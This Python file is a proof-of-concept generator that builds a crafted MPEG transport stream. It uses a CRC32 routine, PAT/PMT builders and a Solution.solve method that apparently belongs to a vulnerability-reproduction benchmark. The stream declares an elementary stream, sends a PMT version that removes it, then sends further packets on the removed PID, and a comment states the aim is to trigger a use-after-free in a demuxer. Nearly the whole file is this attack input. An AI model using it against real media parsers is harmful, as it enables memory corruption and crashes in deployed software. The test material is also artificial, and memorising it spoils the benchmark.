import struct
from typing import List

def crc32_mpeg(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF

def build_pat_section(pmt_pid: int, tsid: int = 1, version: int = 0) -> bytes:
    body = bytearray()
    body += struct.pack(">H", tsid)
    body += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])  # version and current_next_indicator=1
    body += b"\x00\x00"  # section_number, last_section_number
    # One program entry: program_number=1 -> PMT PID
    body += struct.pack(">H", 1)
    pid_field = 0xE000 | (pmt_pid & 0x1FFF)
    body += struct.pack(">H", pid_field)
    section_length = len(body) + 4  # + CRC
    header = bytearray()
    header += bytes([0x00])  # table_id
    header += struct.pack(">H", 0xB000 | (section_length & 0x0FFF))
    data_for_crc = bytes(header + body)
    crc = crc32_mpeg(data_for_crc)
    return data_for_crc + struct.pack(">I", crc)

def build_pmt_section(program_number: int, pcr_pid: int, streams: List[tuple], version: int = 0) -> bytes:
    body = bytearray()
    body += struct.pack(">H", program_number)
    body += bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])  # version and current_next_indicator=1
    body += b"\x00\x00"  # section_number, last_section_number
    body += struct.pack(">H", 0xE000 | (pcr_pid & 0x1FFF))  # PCR PID
    body += struct.pack(">H", 0xF000)  # program_info_length = 0
    # Streams
    for stream_type, elem_pid in streams:
        body += bytes([stream_type & 0xFF])
        body += struct.pack(">H", 0xE000 | (elem_pid & 0x1FFF))
        body += struct.pack(">H", 0xF000)  # ES_info_length = 0
    section_length = len(body) + 4
    header = bytearray()
    header += bytes([0x02])  # table_id for PMT
    header += struct.pack(">H", 0xB000 | (section_length & 0x0FFF))
    data_for_crc = bytes(header + body)
    crc = crc32_mpeg(data_for_crc)
    return data_for_crc + struct.pack(">I", crc)

def pack_ts_packet(pid: int, payload: bytes, payload_unit_start: bool, continuity_counter: int) -> bytes:
    header = bytearray()
    header.append(0x47)
    b1 = ((1 if payload_unit_start else 0) << 6) | ((pid >> 8) & 0x1F)
    header.append(b1)
    header.append(pid & 0xFF)
    header.append(0x10 | (continuity_counter & 0x0F))  # payload only
    # Pad payload to 184 bytes
    if len(payload) < 184:
        payload = payload + (b'\xFF' * (184 - len(payload)))
    elif len(payload) > 184:
        payload = payload[:184]
    return bytes(header) + payload

def build_pointer_payload(section: bytes) -> bytes:
    return bytes([0x00]) + section

def build_pes_payload(stream_id: int = 0xE0, data_len: int = 20) -> bytes:
    # Minimal PES header: start code + stream_id + PES_packet_length (set to 0 for video - allowed)
    # Then some dummy bytes
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes += bytes([stream_id & 0xFF])
    pes += b"\x00\x00"  # length 0 (often allowed for video)
    # Add some filler data
    if data_len > 0:
        pes += b"\x00" * data_len
    return bytes(pes)

class Solution:
    def solve(self, src_path: str) -> bytes:
        packets = []

        # Packet 1: PAT -> PMT PID 0x0100
        pat = build_pat_section(pmt_pid=0x0100, tsid=1, version=0)
        pat_payload = build_pointer_payload(pat)
        packets.append(pack_ts_packet(pid=0x0000, payload=pat_payload, payload_unit_start=True, continuity_counter=0))

        # Packet 2: PMT v0 with one ES PID 0x0065 (type H.264)
        pmt_v0 = build_pmt_section(program_number=1, pcr_pid=0x1FFF, streams=[(0x1B, 0x0065)], version=0)
        pmt_payload_v0 = build_pointer_payload(pmt_v0)
        packets.append(pack_ts_packet(pid=0x0100, payload=pmt_payload_v0, payload_unit_start=True, continuity_counter=0))

        # Packet 3: PES for PID 0x0065
        pes1 = build_pes_payload(stream_id=0xE0, data_len=20)
        packets.append(pack_ts_packet(pid=0x0065, payload=pes1, payload_unit_start=True, continuity_counter=0))

        # Packet 4: PMT v1 that removes ES PID 0x0065 and introduces a new ES at 0x0066
        pmt_v1 = build_pmt_section(program_number=1, pcr_pid=0x1FFF, streams=[(0x03, 0x0066)], version=1)
        pmt_payload_v1 = build_pointer_payload(pmt_v1)
        packets.append(pack_ts_packet(pid=0x0100, payload=pmt_payload_v1, payload_unit_start=True, continuity_counter=1))

        # Packet 5: TS payload on old freed PID 0x0065 to potentially trigger UAF
        pes2 = b"\x00" * 40
        packets.append(pack_ts_packet(pid=0x0065, payload=pes2, payload_unit_start=False, continuity_counter=1))

        # Packet 6: Null packet PID 0x1FFF
        null_payload = b"\xFF" * 184
        packets.append(pack_ts_packet(pid=0x1FFF, payload=null_payload, payload_unit_start=False, continuity_counter=0))

        return b"".join(packets)
